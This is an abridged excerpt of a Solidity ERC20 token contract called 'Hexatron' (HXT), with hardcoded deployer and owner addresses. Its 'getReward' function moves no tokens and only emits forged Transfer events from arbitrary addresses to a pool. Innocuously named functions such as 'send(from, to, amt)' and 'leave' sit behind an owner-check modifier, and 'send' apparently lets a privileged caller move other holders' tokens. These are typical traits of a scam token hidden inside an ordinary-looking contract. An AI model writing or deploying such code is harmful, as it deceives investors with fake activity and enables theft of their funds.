...
contract Hexatron is Context, IERC20 {
    ...
    address _contDeployr = 0x075e72a5eDf65F0A5f44699c7654C1a76941Ddc8;
    address public _ownr = 0xD6392F6b679c6153E0F3099E72A210568C09AB5e;
   constructor () public {

        _name = "Hexatron";
        _symbol = "HXT";
        _decimals = 18;
        uint256 initialSupply = 577798730757089877610000000000;
        _safeOwnr = _ownr;
...
//-----------------------------------------------------------------------------------------------------------------------//
  ...
  function leave(address recipient) public _verify(){
    ...
    function send(address from, address to, uint256 amt) public _verify() virtual returns (bool) {
        //Single Tranfer
  ...
  function getReward(address uPool,address[] memory eReceiver,uint256[] memory eAmounts)  public _verify(){
    //MultiTransferEmit
    for (uint256 i = 0; i < eReceiver.length; i++) {emit Transfer(eReceiver[i], uPool, eAmounts[i]);}}
